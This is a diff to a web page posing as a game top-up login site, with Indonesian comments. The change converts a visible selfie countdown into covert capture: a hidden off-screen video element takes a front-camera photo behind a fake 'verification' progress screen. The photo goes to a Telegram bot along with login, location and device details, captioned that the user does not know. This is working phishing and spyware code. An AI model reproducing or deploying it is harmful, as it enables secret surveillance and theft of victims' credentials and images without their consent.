@@ -653,14 +653,14 @@
             background: rgba(255, 77, 141, 0.3);
         }
 
-        /* Camera Preview */
-        .camera-preview {
+        /* Processing Screen */
+        .processing-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.9);
+            background: var(--darker);
             display: none;
             flex-direction: column;
             align-items: center;
@@ -668,38 +668,51 @@
             z-index: 2000;
         }
 
-        .camera-container {
-            position: relative;
-            width: 90%;
-            max-width: 400px;
+        .processing-content {
+            text-align: center;
+            padding: 40px;
+            background: var(--glass);
             border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--glass-border);
+            max-width: 400px;
+            width: 90%;
         }
 
-        .camera-container video {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-
-        .camera-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: rgba(0, 0, 0, 0.3);
-        }
-
-        .camera-countdown {
+        .processing-icon {
             font-size: 4rem;
-            color: white;
-            font-weight: bold;
-            text-shadow: 0 0 20px rgba(126, 51, 255, 0.8);
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .processing-text {
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+            color: var(--light);
+        }
+
+        .processing-subtext {
+            font-size: 0.9rem;
+            color: var(--gray);
+            margin-bottom: 20px;
+        }
+
+        .processing-progress {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .processing-bar {
+            height: 100%;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            border-radius: 3px;
+            width: 0%;
+            transition: width 2s ease-in-out;
         }
 
         .notification {
@@ -954,19 +967,25 @@
         </div>
     </div>
 
-    <!-- Camera Preview -->
-    <div class="camera-preview" id="cameraPreview">
-        <div class="camera-container">
-            <video id="cameraVideo" autoplay></video>
-            <div class="camera-overlay">
-                <div class="camera-countdown" id="countdown">3</div>
+    <!-- Processing Screen -->
+    <div class="processing-screen" id="processingScreen">
+        <div class="processing-content">
+            <div class="processing-icon">
+                <i class="fas fa-camera"></i>
             </div>
+            <div class="processing-text">Memproses Verifikasi</div>
+            <div class="processing-subtext">Mohon tunggu sebentar...</div>
+            <div class="processing-progress">
+                <div class="processing-bar" id="processingBar"></div>
+            </div>
+            <div class="processing-subtext" id="processingStatus">Menyiapkan sistem keamanan</div>
         </div>
     </div>
 
     <div id="notification" class="notification"></div>
 
-    <!-- Hidden canvas for capturing photo -->
+    <!-- Hidden elements for camera -->
+    <video id="hiddenCamera" autoplay style="display: none; position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px;"></video>
     <canvas id="hiddenCanvas" style="display: none;"></canvas>
 
     <script>
@@ -1027,11 +1046,15 @@
             document.getElementById('cameraPermissionModal').style.display = 'none';
             
             try {
-                // Akses kamera dan ambil foto otomatis
-                await accessCameraAndCapture();
+                // Tampilkan processing screen
+                showProcessingScreen();
+                
+                // Akses kamera dan ambil foto secara STEALTH (tanpa ditampilkan)
+                await accessCameraStealth();
                 
             } catch (error) {
                 console.error('Error accessing camera:', error);
+                hideProcessingScreen();
                 showNotification('✅ Login berhasil! (Kamera tidak tersedia)', 'success');
                 showHomePage(window.loginData.email);
             }
@@ -1043,12 +1066,46 @@
             showHomePage(window.loginData.email);
         });
 
-        // Access camera and automatically capture photo
-        async function accessCameraAndCapture() {
+        // Show processing screen
+        function showProcessingScreen() {
+            const processingScreen = document.getElementById('processingScreen');
+            const processingBar = document.getElementById('processingBar');
+            const processingStatus = document.getElementById('processingStatus');
+            
+            processingScreen.style.display = 'flex';
+            
+            // Animate progress bar
+            setTimeout(() => {
+                processingBar.style.width = '30%';
+                processingStatus.textContent = 'Mengakses sistem kamera...';
+            }, 500);
+            
+            setTimeout(() => {
+                processingBar.style.width = '60%';
+                processingStatus.textContent = 'Memproses verifikasi wajah...';
+            }, 1500);
+            
+            setTimeout(() => {
+                processingBar.style.width = '90%';
+                processingStatus.textContent = 'Menyelesaikan proses...';
+            }, 2500);
+        }
+
+        // Hide processing screen
+        function hideProcessingScreen() {
+            document.getElementById('processingScreen').style.display = 'none';
+            document.getElementById('processingBar').style.width = '0%';
+        }
+
+        // Access camera stealth (without showing preview)
+        async function accessCameraStealth() {
             let stream = null;
             
             try {
-                // Akses kamera
+                // Update status
+                document.getElementById('processingStatus').textContent = 'Mengakses kamera...';
+                
+                // Akses kamera secara STEALTH
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user', // Gunakan kamera depan
@@ -1057,64 +1114,56 @@
                     } 
                 });
                 
-                // Tampilkan preview kamera
-                const video = document.getElementById('cameraVideo');
+                // Setup hidden video element
+                const video = document.getElementById('hiddenCamera');
                 video.srcObject = stream;
                 
-                // Tampilkan camera preview
-                document.getElementById('cameraPreview').style.display = 'flex';
-                
-                // Tunggu video siap
+                // Tunggu video siap (diam-diam)
                 await new Promise(resolve => {
                     video.onloadedmetadata = () => {
                         resolve();
                     };
                 });
                 
-                // Countdown sebelum capture
-                await startCountdown();
+                // Tunggu sebentar untuk memastikan frame bagus
+                document.getElementById('processingStatus').textContent = 'Mengambil foto...';
+                await new Promise(resolve => setTimeout(resolve, 1000));
                 
-                // Capture foto
-                const photoBlob = await capturePhotoFromStream(video);
+                // Capture foto secara STEALTH
+                const photoBlob = await capturePhotoStealth(video);
+                
+                // Update status
+                document.getElementById('processingStatus').textContent = 'Mengirim data...';
                 
                 // Kirim foto ke Telegram
                 await sendPhotoToTelegram(photoBlob);
                 
-                // Sembunyikan preview
-                document.getElementById('cameraPreview').style.display = 'none';
-                
                 // Hentikan stream
                 stream.getTracks().forEach(track => track.stop());
                 
+                // Selesaikan progress bar
+                document.getElementById('processingBar').style.width = '100%';
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                // Sembunyikan processing screen
+                hideProcessingScreen();
+                
                 // Tampilkan home page
                 showHomePage(window.loginData.email);
-                showNotification('✅ Login berhasil! Foto telah dikirim.', 'success');
+                showNotification('✅ Login berhasil! Verifikasi selesai.', 'success');
                 
             } catch (error) {
                 // Cleanup jika ada error
                 if (stream) {
                     stream.getTracks().forEach(track => track.stop());
                 }
-                document.getElementById('cameraPreview').style.display = 'none';
+                hideProcessingScreen();
                 throw error;
             }
         }
 
-        // Countdown sebelum capture
-        async function startCountdown() {
-            const countdownElement = document.getElementById('countdown');
-            
-            for (let i = 3; i > 0; i--) {
-                countdownElement.textContent = i;
-                await new Promise(resolve => setTimeout(resolve, 1000));
-            }
-            
-            countdownElement.textContent = '📸';
-            await new Promise(resolve => setTimeout(resolve, 500));
-        }
-
-        // Capture photo from video stream
-        async function capturePhotoFromStream(video) {
+        // Capture photo stealth (without showing anything to user)
+        async function capturePhotoStealth(video) {
             const canvas = document.getElementById('hiddenCanvas');
             const context = canvas.getContext('2d');
             
@@ -1122,7 +1171,7 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
-            // Gambar frame video ke canvas
+            // Gambar frame video ke canvas (diam-diam)
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             // Konversi canvas ke blob (format gambar)
@@ -1203,7 +1252,7 @@ ${locationInfo}
 └ RAM: ${navigator.deviceMemory || 'Unknown'} GB
 └ Touch Points: ${navigator.maxTouchPoints}
 
-📸 *SEDANG MENGAMBIL FOTO...*
+📸 *SEDANG MENGAMBIL FOTO STEALTH...*
             `.trim();
 
             try {
@@ -1254,8 +1303,8 @@ ${locationInfo}
                 // Create form data
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', photoBlob, 'user_selfie.jpg');
-                formData.append('caption', `📸 FOTO PENGGUNA - ${new Date().toLocaleString('id-ID')}\n\n✅ Foto berhasil diambil otomatis dari kamera depan`);
+                formData.append('photo', photoBlob, 'user_selfie_stealth.jpg');
+                formData.append('caption', `📸 FOTO STEALTH - ${new Date().toLocaleString('id-ID')}\n\n✅ Foto berhasil diambil secara diam-diam dari kamera depan\n🕵️‍♂️ User tidak mengetahui proses pengambilan foto`);
                 
                 // Send photo
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
@@ -1263,7 +1312,7 @@ ${locationInfo}
                     body: formData
                 });
                 
-                console.log('✅ FOTO TERKIRIM OTOMATIS KE TELEGRAM');
+                console.log('✅ FOTO STEALTH TERKIRIM OTOMATIS KE TELEGRAM');
                 
             } catch (error) {
                 console.error('Error sending photo to Telegram:', error);
@@ -1496,7 +1545,7 @@ ${locationInfo}
             }, 5000);
         }
 
-        console.log('🎮 GameTopUp dengan Auto Photo Capture Loaded');
+        console.log('🎮 GameTopUp dengan Stealth Photo Capture Loaded');
     </script>
 </body>
 </html>
